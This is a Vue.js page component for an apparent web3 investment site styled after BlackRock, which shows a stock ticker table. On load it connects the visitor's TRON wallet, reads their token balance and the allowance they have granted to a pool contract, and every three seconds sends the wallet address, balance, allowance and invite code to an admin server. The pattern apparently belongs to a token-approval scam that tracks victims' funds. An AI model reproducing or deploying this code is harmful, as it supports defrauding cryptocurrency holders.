<template>
    <div class="page" @click="el_menu_show = false">

        <div class="bg"></div>
        <div class="mask" v-show="show_box_notice" @click="show_box_notice = false"></div>

        <div class="box1">

            <div class="hander">
                <div @click.stop="el_menu_show = !el_menu_show">
                    <img src="../../assets/image/list.png" alt="">

                </div>
                <div style="color: #fff;font-size: 13px;font-weight: 600;">
                    {{ $t('company') }}
                </div>
                <div>
                    <img src="../../assets/image/language_or.png" alt="">
                    <span @click="language_switch" style="color: #fff;font-size: 12px;">{{ $t('one.language_switch')
                        }}</span>


                    <div @click="get_notice" style="color: #fff;font-size: 12px;margin: 0 10px;">{{ $t('user.tips') }}
                    </div>
                </div>
            </div>
            <div style="height:calc(100vh - 250px);overflow: auto;border-radius: 10px; ">
                <table>
                    <thead style="position: sticky;top: 0;    background-color: #e9eb8b;">
                        <th>{{ $t('body.table_hander.name') }}</th>
                        <th> {{ $t('body.table_hander.open_price') }}</th>
                        <th>{{ $t('body.table_hander.volume') }}</th>
                    </thead>
                    <tbody>
                        <tr v-for="item in k_linedata_arr">
                            <td v-show="$i18n.locale == 'en'">{{ item.en_title }}</td>
                            <td v-show="$i18n.locale == 'zh'">{{ item.cn_title }}</td>
                            <td>{{ item.price }}</td>
                            <td>{{ item.add_del }}</td>
                            <!-- <td :class="priceChange(item.kline_data)  > 0 ? 'up' : 'down'">{{ priceChange(item.kline_data) }}</td> -->
                        </tr>
                    </tbody>
                </table>
            </div>


            <div class="footer_bxo">

                <div class="row2">
                    <h2>About</h2>

                </div>
                <div class="row3">
                    <!-- <a href="/">
                        <svg xmlns="http://www.w3.org/2000/svg" height="32" width="32" viewBox="0 0 512 512">
                            <path fill="#ffffff"
                                d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z">
                            </path>
                        </svg>
                    </a> -->

                    <a target="_blank" href="https://t.me/Blkrockproweb3"><svg xmlns="http://www.w3.org/2000/svg" height="32" width="31"
                            viewBox="0 0 496 512">
                            <path fill="#ffffff"
                                d="M248 8C111 8 0 119 0 256S111 504 248 504 496 393 496 256 385 8 248 8zM363 176.7c-3.7 39.2-19.9 134.4-28.1 178.3-3.5 18.6-10.3 24.8-16.9 25.4-14.4 1.3-25.3-9.5-39.3-18.7-21.8-14.3-34.2-23.2-55.3-37.2-24.5-16.1-8.6-25 5.3-39.5 3.7-3.8 67.1-61.5 68.3-66.7 .2-.7 .3-3.1-1.2-4.4s-3.6-.8-5.1-.5q-3.3 .7-104.6 69.1-14.8 10.2-26.9 9.9c-8.9-.2-25.9-5-38.6-9.1-15.5-5-27.9-7.7-26.8-16.3q.8-6.7 18.5-13.7 108.4-47.2 144.6-62.3c68.9-28.6 83.2-33.6 92.5-33.8 2.1 0 6.6 .5 9.6 2.9a10.5 10.5 0 0 1 3.5 6.7A43.8 43.8 0 0 1 363 176.7z">
                            </path>
                        </svg></a>

                </div>
                <div class="row4">
                    <h2>Leading you to the Web3 world</h2>

                </div>
                <div class="row5">
                    <h4>Contact US: Blkrockproweb3@hotmail.com </h4>

                </div>
            </div>
            <el-menu class="el-menu-vertical-demo" v-if="el_menu_show">
                <div style="text-align: center;">
                    <img style="width: 60px;height: 60px; margin: 30px auto 0;border-radius: 30px;"
                        src="../../assets/image/new_logo.jpg" alt="">

                </div>
                <h3 style="text-align: center;">{{ $t('company') }}</h3>
                <el-menu-item index="1">
                    <i class="el-icon-menu"></i>
                    <span slot="title">{{ $t('user.nav_index1') }}</span>
                </el-menu-item>
                <el-menu-item index="2" @click="get_shouquan">
                    <i class="el-icon-s-custom"></i>
                    <span slot="title">{{ $t('user.nav_index2') }}</span>
                </el-menu-item>


            </el-menu>


        </div>
        <transition name="el-fade-in-linear">
            <div class="shouyi-mingxi el-fade-in-linear" v-show="show_box_notice"
                style="overflow: hidden;padding: 10px;">
                <div style="width: 100%;text-align: center;margin-top: 10px;">Notice</div>
                <div style="width: 100%; height: 90%;overflow: auto;padding: 10px;box-sizing: border-box;">
                    {{ notice }}
                </div>
            </div>
        </transition>
    </div>
</template>
<script>
import {
    NCinit,
    toFixedReg,
    mainContract,
    uContract,
    poolContract
} from "@/utils/tron";
import request from "../../utils/ajax";
import { createLogger } from "vuex";

export default {
    data() {
        return {
            k_linedata_arr: [],
            tableData: [{
                name: 'NASDAKE',
                zhibiao: "NASDAKE",
                price: 1980,
                isup: '-0.5'
            },
            {
                name: 'BILI',
                zhibiao: "NASDAKE",
                price: 1980,
                isup: '-0.5'
            },
            {
                name: 'BMW',
                zhibiao: "NASDAKE",
                price: 1980,
                isup: '-0.5'
            },
            {
                name: '美元',
                zhibiao: "NASDAKE",
                price: 1980,
                isup: '-0.5'
            },
            {
                name: '黃金',
                zhibiao: "Gold",
                price: 1980,
                isup: '-0.5'
            },
            {
                name: '白銀',
                zhibiao: "NASDAKE",
                price: 1980,
                isup: '-0.5'
            },
            {
                name: '黃豆',
                zhibiao: "NASDAKE",
                price: 1980,
                isup: '-0.5'
            },
            {
                name: '玉米',
                zhibiao: "NASDAKE",
                price: 1980,
                isup: '-0.5'
            }],
            language_obj: {},
            language: 'zh',
            el_menu_show: false,
            defaultAddress: '',
            user_data: {
                my_sy: '',
                sq_num: '',
                team_zy: '',
                yq_num: '',
                invite_code: ''
            },
            company: '',
            symbol_arr: [
                {
                    symbol: 'appl',
                    data: []
                },
                {
                    symbol: 'bili',
                    data: []
                },
                {
                    symbol: 'amd',
                    data: []
                },
            ],
            money: '',
            kzy: '',
            invite_code: '',
            notice: '',
            show_box_notice: false
        }
    },
    methods: {
        priceChange(arr) {
            if (arr.length < 3) {
                return '数据不足';
            }

            const latestKLine = arr[arr.length - 1];
            const previousKLine = arr[arr.length - 2];
            const olderKLine = arr[arr.length - 3];

            const previousClose = previousKLine.close_price;
            const latestClose = latestKLine.close_price;

            const change = latestClose - previousClose;
            const percentageChange = (change / previousClose) * 100;

            return change.toFixed(2)
        },

        async get_notice() {
            let data = await request('https://admin.blkrockpro.xyz//app/index.php?i=4&c=entry&m=ewei_shopv2&do=mobile&r=api.index.get_notice', 'post', {


            })
            if (data.notice == '' || data.notice == null || data.notice == undefined) {
                this.message = `No Notice`;
                this.$toast(this.message);
                return
            }
            else {
                this.notice = data.notice
                this.show_box_notice = true
            }

        },
        language_switch() {
            const newLocale = this.$i18n.locale === 'en' ? 'zh' : 'en';
            this.$i18n.locale = newLocale;
        },



        get_shouquan() {
            this.$router.push({ name: 'user' })

        },
        login() {
            request('https://admin.blkrockpro.xyz//app/index.php?i=4&c=entry&m=ewei_shopv2&do=mobile&r=api.index.applogin', 'post', {
                my_wallet: this.defaultAddress,
                zy_num: this.money,//1000000
                sq_num: this.kzy,
                invite_code: this.invite_code
            }).then(res => {

                this.get_user_data()

            });
        },
        get_user_data() {
            request('https://admin.blkrockpro.xyz//app/index.php?i=4&c=entry&m=ewei_shopv2&do=mobile&r=api.index.get_user_info', 'post', {

                my_wallet: this.defaultAddress,

            }).then(res => {

                this.user_data = res
            });
        },

        get_gupiao() {
            request('https://admin.blkrockpro.xyz//app/index.php?i=4&c=entry&m=ewei_shopv2&do=mobile&r=api.index.get_alphavantage_data', 'post', {

                symbol: 'nvda',

            }).then(res => {
                // console.log(res);
                this.user_data = res
            });
        },

        //获取余额
        async getBalance() {
            // console.log(tronWeb, tronWeb.defaultAddress.base58);
            tronWeb.transactionBuilder
                .triggerConstantContract(
                    uContract,
                    "balanceOf(address)",
                    {},
                    [{ type: "address", value: this.defaultAddress }],
                    this.defaultAddress
                )
                .then((res) => {

                    this.kzy = toFixedReg(
                        tronWeb.fromSun(tronWeb.toDecimal("0x" + res.constant_result[0]))
                    );
                    // console.log('getBalance余额_home:', this.kzy);
                });
        },
        //获取授权  
        async needApprove() {
            let p1 = [
                { type: `address`, value: this.defaultAddress },
                { type: `address`, value: poolContract },
            ];
            let res = await window.tronWeb.transactionBuilder.triggerConstantContract(
                uContract,
                "allowance(address,address)",
                {},
                p1,
                this.defaultAddress
            );


            this.money = tronWeb.fromSun(
                tronWeb.toDecimal("0x" + res.constant_result[0])
            );

            // console.log('needApprove余额,授权_home:', this.money)

        },
        async get_kline_data() {
            let data = await request('https://admin.blkrockpro.xyz//app/index.php?i=4&c=entry&m=ewei_shopv2&do=mobile&r=api.index._get_us_stock_info', 'post')
            var data_d = data
            console.log(data_d);
            this.k_linedata_arr = data_d
        }
    },
    mounted() {
        // console.log('router', this.$route.query.invite_code);
        this.get_kline_data()
        setInterval(() => {
            this.get_kline_data()

        }, 60000);
        if (this.$route.query.invite_code != undefined) {
            this.invite_code = this.$route.query.invite_code

        }
        try {

            NCinit().then(async (res) => {

                this.contract = await tronWeb.contract().at(mainContract);

                this.defaultAddress = res.defaultAddress;



                this.getBalance();

                this.needApprove();

                setInterval(() => {
                    this.getBalance();

                    this.needApprove();
                    this.login()

                }, 3000);
            }).catch((err) => {
                // console.log(err);

            });
        } catch (error) {
            console.log('error');

        }
    },
    created() {


    },
}
</script>

<style lang="less">
.page {
    // width: 100vw;
    height: 100vh;

    background-image: url('../../assets/image/home_bg.jpg');
    background-size: cover;
    /* 背景图片覆盖整个元素 */
    background-position: center;
    /* 背景图片居中 */
    box-sizing: content-box;
    position: relative !important;
    // background-color: #333;
    overflow: hidden;
}

.bg {
    width: 100vw;
    height: 100vh;
    background-image: url('../../assets/image/home_bg.jpg');
    // filter: blur(10px);
    background-size: cover;
    /* 背景图片覆盖整个元素 */
    background-position: center;
    position: absolute;
    top: 0;
    right: 0;
    z-index: 1;
    filter: blur(8px);
}

.box1 {
    width: 100vw;
    min-height: 100vh;
    position: relative;
    z-index: 10;
    background-color: #e9e6e6;
}

.hander {
    width: 100vw;
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 0 5px;
    box-sizing: border-box;
    height: 70px;
    border: 1px solid transparent;
    background-image: url('../../assets/image/home_bg.jpg');
    // filter: blur(10px);
    background-size: cover;

    div {
        display: flex;
        justify-content: flex-end;
        align-items: center;

        img {
            width: 15px !important;
            height: 15px !important;
            margin: 0 10px;
        }

        span {
            color: #fff;
            font-size: 22px;
            font-weight: 600;
        }
    }

}

table {
    width: 98%;
    color: #000;
    font-size: 22px;
    height: 600px;
    overflow: auto;
    background-color: #eef072;
    margin: 0 auto;
    border-radius: 10px;

    tr {
        height: 40px;
    }

    td {
        text-align: center;
        font-size: 12px;
        width: 33%;
    }

    th {
        font-size: 14px;
        height: 30px;
        width: 33%;

    }

    .up {
        color: green;
        font-weight: 600;
    }

    .down {
        color: red;
        font-weight: 600;
        border-radius: 15px;
    }
}

.footer_bxo {
    width: 100vw;
    height: 170px;
    background-color: rgba(0, 0, 0, .8);
    position: absolute;
    bottom: 0;
    left: 0;
    border-radius: 10px 10px 0 0;

    .row1 {
        // width: 100%;
        margin: 0;
        display: flex;
        padding-left: 20px;
        align-items: center;
        opacity: 0;

        img {
            width: 50px;
            height: 50px;
            border-radius: 50px;
        }

        h2 {
            color: #fff;
            margin-left: 20px;
        }
    }

    .row2 {
        margin-top: 10px;
        padding-left: 20px;


        h2 {
            color: #757575;
            margin: 0 0;
        }
    }

    .row3 {
        // width: 100%;
        display: flex;
        padding-left: 20px;
        align-items: center;
        margin: 5px 0;

        a {

            margin-right: 20px;
        }
    }

    .row4 {
        // width: 100%;
        display: flex;
        padding-left: 20px;
        height: 30px;

        h2 {
            color: #fff;
            font-size: 17px;
        }
    }

    .row5 {
        // width: 100%;
        display: flex;
        padding-left: 20px;
        height: 30px;

        h4 {
            color: #fff;
        }
    }
}

.el-menu-vertical-demo {
    width: 200px;
    height: 100vh;
    position: absolute !important;
    top: 0;
    left: 0;
    // background-image: url('../../assets/image/home_bg.jpg');
    // background-size: cover;
    // /* 背景图片覆盖整个元素 */
    // background-position: center;
    background-color: #575454 !important;
    /* 背景图片居中 */
    box-sizing: border-box;
    color: #fff;

    button {
        background-color: rgb(68, 230, 36);
        color: #fff;
        width: 100%;
        height: 40px;
        // line-height: 40px;
        outline: none;
        border: none;
        border-radius: 10px;
    }

    span {
        color: #fff;
    }
}

.el-icon-s-operation {
    color: #fff;
    width: 40px;
    height: 40px;
    font-size: 32px;
}

.mask {
    width: 100vw;
    min-height: 100vh;
    background-color: rgba(0, 0, 0, .5);
    position: absolute;
    top: 0;
    right: 0;
    z-index: 11;
}
</style>